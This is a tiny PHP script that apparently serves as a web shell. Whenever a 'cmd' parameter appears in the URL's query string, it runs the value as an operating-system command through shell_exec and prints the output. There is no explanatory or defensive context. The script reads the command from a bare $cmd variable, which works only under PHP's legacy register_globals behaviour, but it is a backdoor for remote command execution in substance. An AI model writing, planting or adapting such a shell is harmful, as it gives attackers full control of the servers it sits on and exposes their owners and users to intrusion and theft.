<?php
function ekse($cmd){
	if(function_exists('shell_exec')){
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

if(isset($_GET['cmd']) && ($_GET['cmd'] != "")){
	$result = ekse($cmd);
	echo $result;
}
	
?>